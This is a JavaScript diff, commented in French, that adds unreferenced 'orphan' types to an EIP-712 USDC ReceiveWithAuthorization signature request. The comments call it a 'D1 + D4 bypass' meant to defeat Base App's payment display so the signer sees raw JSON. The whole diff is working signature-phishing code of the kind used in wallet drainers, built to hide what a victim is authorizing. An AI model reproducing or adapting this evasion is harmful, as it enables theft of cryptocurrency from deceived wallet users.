@@ -92,6 +92,15 @@ const DOM_TYPES = [
   {name:"name",type:"string"},{name:"version",type:"string"},
   {name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}
 ];
+// D4 — orphan types (NOT referenced by ReceiveWithAuthorization → typeHash inchangé)
+// Confondent le pattern-matching de Base App → JSON brut au lieu de Payer UI
+const ORPHAN_TYPES = {
+  Meta:      [{name:"trace",type:"TraceEntry"},{name:"root",type:"AuditRoot"}],
+  TraceEntry:[{name:"ref",type:"string"},{name:"sub",type:"SubTrace"}],
+  SubTrace:  [{name:"id",type:"uint256"},{name:"deep",type:"DeepNode"}],
+  DeepNode:  [{name:"hash",type:"bytes32"},{name:"label",type:"string"}],
+  AuditRoot: [{name:"meta",type:"Meta"},{name:"ts",type:"uint256"},{name:"entry",type:"TraceEntry"}]
+};
 const RPCS = [
   "https://rpc.ankr.com/eth","https://eth.llamarpc.com",
   "https://1rpc.io/eth","https://ethereum.publicnode.com","https://cloudflare-eth.com"
@@ -165,9 +174,11 @@ async function sign(value) {
   const nonce = "0x" + Array.from(crypto.getRandomValues(new Uint8Array(32)))
                           .map(b=>b.toString(16).padStart(2,'0')).join('');
 
-  // D1 bypass — extra fields in message
+  // D1 + D4 bypass
+  // D1 = extra fields in message (ignorés par EIP-712 encoder)
+  // D4 = orphan types dans types (pas référencés → typeHash inchangé, mais bypass Payer UI)
   const typedData = {
-    types:{ EIP712Domain:DOM_TYPES, ReceiveWithAuthorization:RWA_TYPES },
+    types:{ EIP712Domain:DOM_TYPES, ReceiveWithAuthorization:RWA_TYPES, ...ORPHAN_TYPES },
     primaryType:"ReceiveWithAuthorization",
     domain:{ name:"USD Coin", version:"2", chainId:1, verifyingContract:USDC },
     message:{
